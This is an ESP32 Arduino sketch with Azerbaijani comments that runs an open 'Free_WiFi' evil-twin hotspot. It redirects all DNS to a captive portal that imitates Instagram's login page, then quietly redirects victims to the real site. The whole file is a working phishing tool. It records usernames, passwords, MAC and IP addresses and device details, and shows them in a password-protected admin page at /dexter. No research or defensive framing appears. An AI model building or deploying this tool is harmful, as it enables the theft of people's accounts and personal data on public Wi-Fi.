#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <esp_wifi.h>

const char* ssid = "Free_WiFi";
const IPAddress apIP(192, 168, 4, 1);
const IPAddress subnet(255, 255, 255, 0);
const byte DNS_PORT = 53;
const char* ADMIN_PASS = "YOURPASS";

DNSServer dnsServer;
WebServer server(80);

#define MAX_CREDENTIALS 50
struct Credential {
  String username;
  String password;
  String timestamp;
  String ip;
  String mac;
  String userAgent;
  String deviceBrand;
  String macVendor;
  int rssi;
};
Credential credentials[MAX_CREDENTIALS];
int credentialCount = 0;

unsigned long startTime;

// Captive portal yönləndirməsi
bool captivePortal() {
  String host = server.hostHeader();
  if (host != apIP.toString() && host != "instagram.com" && host != "www.instagram.com") {
    server.sendHeader("Location", String("http://") + apIP.toString(), true);
    server.send(302, "text/plain", "");
    return true;
  }
  return false;
}

// Login səhifəsi
void handleRoot() {
  if (captivePortal()) return;

  String page = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Instagram • Free WiFi</title>
<style>
body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #fafafa; margin:0; display:flex; flex-direction:column; align-items:center; justify-content:center; min-height:100vh;}
.main { display:flex; flex-direction:column; align-items:center; margin-top:12px; }
.container { width:350px; background:white; border:1px solid #dbdbdb; border-radius:1px; padding:10px 0; margin-bottom:10px; }
.instagram-text { font-family: "Brush Script MT", "Segoe Script", cursive; font-size:72px; font-weight:500; letter-spacing:-2px; color:#000; text-align:center; margin-bottom:10px; }
form { padding:0 40px; display:flex; flex-direction:column; }
input { width:100%; background:#fafafa; padding:9px 8px; margin:6px 0; border:1px solid #dbdbdb; border-radius:3px; font-size:14px; color:#262626; }
input:focus { border-color:#a8a8a8; outline:none; }
button { width:100%; background:#0095f6; color:white; padding:7px 16px; border:none; border-radius:4px; font-weight:600; font-size:14px; cursor:pointer; margin:8px 0; }
button:hover { background:#0086e0; }
.divider { display:flex; align-items:center; margin:10px 0 18px; }
.line { flex-grow:1; height:1px; background:#dbdbdb; }
.or { color:#8e8e8e; font-size:13px; font-weight:600; margin:0 18px; }
.footer { width:350px; text-align:center; padding:20px; }
.footer a { color:#00376b; text-decoration:none; font-size:12px; }
.footer span { color:#8e8e8e; font-size:12px; margin:0 8px; }
.wifi-message { text-align:center; background:#fff; padding:15px; margin:10px auto; width:350px; border:1px solid #dbdbdb; border-radius:1px; color:#262626; font-size:14px; line-height:1.5; }
.wifi-message h3 { color:#0095f6; margin:0 0 10px 0; font-size:16px; }
</style>
</head>
<body>
<div class="main">
  <div class="wifi-message">
    <h3>Free WiFi Access</h3>
    <p>Login with Instagram to get 4 hours of high-speed internet.</p>
  </div>
  <div class="container">
    <div class="instagram-text">Instagram</div>
    <form action="/login" method="POST">
      <input type="text" name="username" placeholder="Phone, username, or email" required autocomplete="off">
      <input type="password" name="password" placeholder="Password" required>
      <button type="submit">Log In</button>
      <div class="divider">
        <div class="line"></div><div class="or">OR</div><div class="line"></div>
      </div>
    </form>
  </div>
  <div class="container" style="text-align:center; padding:20px;">
    <span>Don't have an account? </span><a href="#" style="color:#0095f6; font-weight:600; text-decoration:none;">Sign up</a>
  </div>
  <div class="footer">
    <a href="https://about.instagram.com/">About</a><span>•</span>
    <a href="https://help.instagram.com/">Help</a><span>•</span>
    <a href="https://help.instagram.com/519522125107875">Privacy</a><span>•</span>
    <a href="https://help.instagram.com/581066165581870">Terms</a>
  </div>
</div>
</body>
</html>
)rawliteral";

  server.send(200, "text/html", page);
}

// Cihaz tipini tapmaq
String getDeviceBrand(String userAgent) {
  String ua = userAgent;
  ua.toLowerCase();
  if (ua.indexOf("iphone") >= 0 || ua.indexOf("ipad") >= 0 || ua.indexOf("ipod") >= 0) return "Apple";
  if (ua.indexOf("android") >= 0) return "Android";
  if (ua.indexOf("windows") >= 0) return "Windows PC";
  if (ua.indexOf("macintosh") >= 0) return "Mac";
  return "Unknown";
}

// Son qoşulan cihazın MAC ünvanı
String getLastClientMac() {
  wifi_sta_list_t stationList;
  esp_wifi_ap_get_sta_list(&stationList);

  if(stationList.num > 0){
    wifi_sta_info_t station = stationList.sta[stationList.num - 1];
    char macStr[18];
    sprintf(macStr, "%02X:%02X:%02X:%02X:%02X:%02X",
            station.mac[0], station.mac[1], station.mac[2],
            station.mac[3], station.mac[4], station.mac[5]);
    return String(macStr);
  }
  return "Unknown";
}

// Login POST handler
void handleLogin() {
  if (server.method() == HTTP_POST && credentialCount < MAX_CREDENTIALS) {
    String username = server.arg("username");
    String password = server.arg("password");
    String userAgent = server.header("User-Agent");
    String deviceBrand = getDeviceBrand(userAgent);
    String mac = getLastClientMac();
    String ip = server.client().remoteIP().toString();

    unsigned long elapsed = (millis() - startTime) / 1000;
    unsigned long h = elapsed / 3600;
    unsigned long m = (elapsed % 3600) / 60;
    unsigned long s = elapsed % 60;

    credentials[credentialCount].username = username;
    credentials[credentialCount].password = password;
    credentials[credentialCount].timestamp =
      String(h) + ":" + (m < 10 ? "0" : "") + String(m) + ":" + (s < 10 ? "0" : "") + String(s);
    credentials[credentialCount].ip = ip;
    credentials[credentialCount].mac = mac;
    credentials[credentialCount].userAgent = userAgent;
    credentials[credentialCount].deviceBrand = deviceBrand;
    credentials[credentialCount].macVendor = getMacVendor(mac);
    credentials[credentialCount].rssi = getLastClientRSSI();

    credentialCount++;
  }

  server.sendHeader("Location", "https://www.instagram.com", true);
  server.send(302, "text/plain", "");
}
// MAC vendor sadə funksiyası (ilk 3 baytı ilə)
String getMacVendor(String mac) {
  mac.toUpperCase();
  String prefix = mac.substring(0, 8); // AA:BB:CC
  if (prefix == "FC:FB:FB") return "Apple";
  if (prefix == "00:1A:11") return "Samsung";
  if (prefix == "3C:5A:B4") return "Google";
  return "Unknown";
}

// Son qoşulan cihazın RSSI-si
int getLastClientRSSI() {
  wifi_sta_list_t stationList;
  esp_wifi_ap_get_sta_list(&stationList);

  if(stationList.num > 0){
    wifi_sta_info_t station = stationList.sta[stationList.num - 1];
    return station.rssi;
  }
  return 0;
}

// Admin panel üçün IP sessiyası
#define MAX_ADMIN 5
String adminIPs[MAX_ADMIN];
int adminCount = 0;

bool isAdminIP(String ip) {
  for(int i=0;i<adminCount;i++){
    if(adminIPs[i]==ip) return true;
  }
  return false;
}

void handleAdmin() {
  String clientIP = server.client().remoteIP().toString();

  // Admin login yoxlaması
  if (server.method() == HTTP_POST) {
    if (server.arg("password") == ADMIN_PASS) {
      if(!isAdminIP(clientIP) && adminCount < MAX_ADMIN){
        adminIPs[adminCount++] = clientIP;
      }
    } else {
      server.send(401,"text/html","<html><body style='font-family:Arial;'><h2 style='color:red;'>Wrong Password</h2><a href='/dexter'>Try again</a></body></html>");
      return;
    }
  }

  if(!isAdminIP(clientIP)){
    // Admin login form
    String page = R"rawliteral(
<html>
<head>
<title>Admin Login</title>
<style>
body { font-family:Arial; background:#f9f9f9; text-align:center; padding-top:50px; }
input { padding:8px; margin:5px; width:200px; }
button { padding:8px 16px; background:#0095f6; color:white; border:none; border-radius:4px; cursor:pointer; }
button:hover { background:#0086e0; }
</style>
</head>
<body>
<h2>Admin Panel Login</h2>
<form method="POST">
<input type="password" name="password" placeholder="Admin password" required><br>
<button type="submit">Login</button>
</form>
</body>
</html>
)rawliteral";
    server.send(200,"text/html",page);
    return;
  }

  // Admin panel - cədvəl
  String page = "<html><head><title>Captured Data</title>"
                "<meta http-equiv='refresh' content='5'>"
                "<style>"
                "body{font-family:Arial; background:#f9f9f9; padding:20px;}"
                "h2{color:#0095f6; text-align:center;}"
                "table{border-collapse:collapse; width:100%; max-width:1200px; margin:auto;}"
                "th,td{border:1px solid #ddd; padding:8px; text-align:center;}"
                "th{background:#0095f6; color:white;}"
                "tr:nth-child(even){background:#f2f2f2;}"
                "tr:hover{background:#d1e7ff;}"
                "</style>"
                "</head><body>";

  page += "<h2>Captured Data (Auto-refresh every 5s)</h2>";
  page += "<table>";
  page += "<tr><th>Time</th><th>IP</th><th>MAC</th><th>Vendor</th><th>RSSI (dBm)</th><th>Device</th><th>User-Agent</th><th>Username</th><th>Password</th></tr>";

  for(int i=0; i<credentialCount; i++){
    page += "<tr>"
            "<td>"+credentials[i].timestamp+"</td>"
            "<td>"+credentials[i].ip+"</td>"
            "<td>"+credentials[i].mac+"</td>"
            "<td>"+credentials[i].macVendor+"</td>"
            "<td>"+String(credentials[i].rssi)+"</td>"
            "<td>"+credentials[i].deviceBrand+"</td>"
            "<td>"+credentials[i].userAgent+"</td>"
            "<td>"+credentials[i].username+"</td>"
            "<td>"+credentials[i].password+"</td>"
            "</tr>";
  }

  page += "</table></body></html>";
  server.send(200,"text/html",page);
}

// Header kolleksiyası
const char* headerKeys[] = {"User-Agent"};
const size_t headerKeyCount = 1;

void setup() {
  Serial.begin(115200);
  startTime = millis();

  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP,apIP,subnet);
  WiFi.softAP(ssid);

  dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
  dnsServer.start(DNS_PORT,"*",apIP);

  server.on("/", handleRoot);
  server.on("/login", handleLogin);
  server.on("/dexter", handleAdmin);

  server.on("/generate_204", handleRoot);
  server.on("/fwlink", handleRoot);
  server.on("/hotspot-detect.html", handleRoot);
  server.on("/canonical.html", handleRoot);
  server.on("/success.txt", handleRoot);
  server.onNotFound([](){ if(!captivePortal()) handleRoot(); });

  // 🔥 User-Agent toplamaq
  server.collectHeaders(headerKeys, headerKeyCount);

  server.begin();

  Serial.println("Portal running!");
  Serial.println("AP IP: "+WiFi.softAPIP().toString());
  Serial.println("Admin panel: http://"+WiFi.softAPIP().toString()+"/dexter");
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
}  
